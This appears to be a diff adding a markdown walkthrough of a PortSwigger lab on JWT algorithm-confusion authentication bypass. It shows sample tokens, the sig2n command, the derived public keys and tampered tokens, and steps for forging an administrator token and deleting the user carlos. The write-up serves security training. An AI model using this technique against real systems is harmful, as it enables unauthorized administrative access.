@@ -1398,3 +1398,124 @@ LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFN
 
 
 
+<details>
+    <summary>🟪 Lab: JWT authentication bypass via algorithm confusion with no exposed key</summary>
+
+
+1. login to **`wiener : peter`** twoice to take two JWT tokens 
+
+```json
+eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjU5NTEzMSwic3ViIjoid2llbmVyIn0.KeeaoSqHIwRjoU5yG2z7zGJPjMP9RrDZsRkcKrSOmw1wE9qJKq80YV5gUgJ9FYT8SH8vBcAhwstWk1MlJERFKbfx1Jd-3i10fsdL1mupXdI4vJGsaumM9qfkFb-Rxy0dofay-Y4up-dDdJXxSNeMNx-3sp-j0nih1MEw6CcWQKFRNm3_qW28UB4fCGx9blYaTwqWEzSYG0itbOtnfTcqLbtKsOvBIbla8IGYVfIot-9l6zduDTCpU3gAFSFOBg_FfZoT6iz0ifMztK5B-CYewPECdrN9Zgzf1QYGpDRCcA0EjfjRBRG26r3Xic5JkGxWFtZLKPrLh6Zp7qrDBqLnLg
+```
+
+```json
+eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjU5NTE3Mywic3ViIjoid2llbmVyIn0.AHCl5w7dC41pvq228zEmHkQnlvESeHhsoyzuxGCplpuYX7GtXoZC6NRHHD3D8R5rydl8ckrp2l3vV7RM5UqEVXMRpA7OnsDVNrSwMHyAtNQBQ1iGSCUw3H1kZFqVATrDxU0eioVaNuWsz2pGoxdDMeZX0RmNnEzciWlnI4HI3An-O995ianoBinrOXPN05LusA4cTO-S7Zt-lBJzq7Cs2cmcg1sDMpba6X-8Bt-8A__syw7jZUmHAvFzlz0NDGWLPJ0HtGQdKSXRxi3uYcIXT9EhqfPPbR_PRN9rPrddFYpHJiui5xJ0D3FxgfOXe0LqI-0_kwU2NNI4Dj_HGATQJQ
+```
+
+--- 
+
+> ## after that use this tool form portswigger :
+
+```bash
+sudo docker run --rm -it portswigger/sig2n <token_1> <token_2>
+```
+
+<img width="1331" height="631" alt="image" src="https://github.com/user-attachments/assets/24728a4b-ae55-42c9-8f1c-01b5d8d808b5" />
+
+
+```ruby
+Found n with multiplier 1:
+    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2azBjT0JOVy9FdDNpN3IrYmtZeQpoa0Rpa0FRYTM1SXFGN1duVzZFMjlzZ01PTkJlcXJZaWdmUVB1N05DbEl6YXYrd3Y1QjVzaGs0RTdyQTFOcmNHCkxrbzBiSnA3SzhDR2NVbStKZW9XSUxyNTlOd0NQNzJhaDloUEd0bmJVRnhESjN6K3c2M1ZtV05PQWY1WEJmYzYKd3ZJRmVTVFh2ZVJnU0NsWno3ZFFwTEdrK2ltbWFoNWkrTHc1MDZBbXRjNE1iRWVwL0hacjFycXFqa1NqR1lMcwp1ZmNGTTZRWncrbGd1STVHT1BIVmJhMlBVYmU5KzRlZlUzb2ptMlE2Um9MU3JheWdkWVNsbDg0bzJpQ1hMSXhBCkwwTUZONG1TSEVUVy9vSG00S0tuaU41ZldNeG5iZ0IwOTVNQnFrekZTcWtHV0EySENOVncwKzBOS1VLaEhIYncKS3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
+    Tampered JWT: eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc1NjY3ODExMywgInN1YiI6ICJ3aWVuZXIifQ.EyjdH6rqJVnP_-WdCu1ntdNC2VXIi4heh7-08vGBSRY
+
+
+
+
+ Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXZrMGNPQk5XL0V0M2k3citia1l5aGtEaWtBUWEzNUlxRjdXblc2RTI5c2dNT05CZXFyWWkKZ2ZRUHU3TkNsSXphdit3djVCNXNoazRFN3JBMU5yY0dMa28wYkpwN0s4Q0djVW0rSmVvV0lMcjU5TndDUDcyYQpoOWhQR3RuYlVGeERKM3ordzYzVm1XTk9BZjVYQmZjNnd2SUZlU1RYdmVSZ1NDbFp6N2RRcExHaytpbW1haDVpCitMdzUwNkFtdGM0TWJFZXAvSFpyMXJxcWprU2pHWUxzdWZjRk02UVp3K2xndUk1R09QSFZiYTJQVWJlOSs0ZWYKVTNvam0yUTZSb0xTcmF5Z2RZU2xsODRvMmlDWExJeEFMME1GTjRtU0hFVFcvb0htNEtLbmlONWZXTXhuYmdCMAo5NU1CcWt6RlNxa0dXQTJIQ05WdzArME5LVUtoSEhid0t3SURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
+    Tampered JWT: eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc1NjY3ODExMywgInN1YiI6ICJ3aWVuZXIifQ.GV3wq7HJ_sy7iRRJHEvAKBox9nWf8DL9XlGh4E_kbWM
+
+```
+
+
+> ## founded 2 tokens **`x509`** and **`pkcs1`** from hint we know that it it `x509` but in real world you will try all tokens untill on success
+
+<img width="1040" height="147" alt="image" src="https://github.com/user-attachments/assets/87b35aba-6af3-48db-9f42-35a3fa490644" />
+
+```ruby
+    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2azBjT0JOVy9FdDNpN3IrYmtZeQpoa0Rpa0FRYTM1SXFGN1duVzZFMjlzZ01PTkJlcXJZaWdmUVB1N05DbEl6YXYrd3Y1QjVzaGs0RTdyQTFOcmNHCkxrbzBiSnA3SzhDR2NVbStKZW9XSUxyNTlOd0NQNzJhaDloUEd0bmJVRnhESjN6K3c2M1ZtV05PQWY1WEJmYzYKd3ZJRmVTVFh2ZVJnU0NsWno3ZFFwTEdrK2ltbWFoNWkrTHc1MDZBbXRjNE1iRWVwL0hacjFycXFqa1NqR1lMcwp1ZmNGTTZRWncrbGd1STVHT1BIVmJhMlBVYmU5KzRlZlUzb2ptMlE2Um9MU3JheWdkWVNsbDg0bzJpQ1hMSXhBCkwwTUZONG1TSEVUVy9vSG00S0tuaU41ZldNeG5iZ0IwOTVNQnFrekZTcWtHV0EySENOVncwKzBOS1VLaEhIYncKS3dJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
+    Tampered JWT: eyJraWQiOiJlYzY1OTM4Ny02NWE0LTQyZTgtYmYyMC1iNGU3NDcxN2UwNmYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc1NjY3ODExMywgInN1YiI6ICJ3aWVuZXIifQ.EyjdH6rqJVnP_-WdCu1ntdNC2VXIi4heh7-08vGBSRY
+```
+
+
+> ## now let's try to put then new jwt and see or to make sure it true:
+
+<img width="1491" height="739" alt="image" src="https://github.com/user-attachments/assets/3b6d7537-ea85-470c-9867-00bcd2dc53f8" />
+
+> ## after we make sure let's make new **`symetric key`** and change it's **`k`** value with **`base64 encoded x509 key`**
+
+<img width="816" height="619" alt="image" src="https://github.com/user-attachments/assets/c0bc7104-0cd8-4595-8aa5-da983e57785f" />
+
+> ## go to repeater to reqest and change :
+> - path to **`/admin`**
+> - user to **`administrator`**
+> - click sign and choose the **`new symmetric key`**
+
+<img width="988" height="761" alt="image" src="https://github.com/user-attachments/assets/94cc9ad1-ec5d-4c09-b4ba-d554f135fb83" />
+
+> ## send the request 
+
+<img width="1521" height="707" alt="image" src="https://github.com/user-attachments/assets/e2f83638-f78c-4a55-b55e-824fba103adf" />
+
+> change path to **`GET /admin/delete?username=carlos HTTP/2`**
+
+<img width="1543" height="730" alt="image" src="https://github.com/user-attachments/assets/6a0ee703-3173-4662-92e8-cda37cfaa913" />
+
+    
+</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
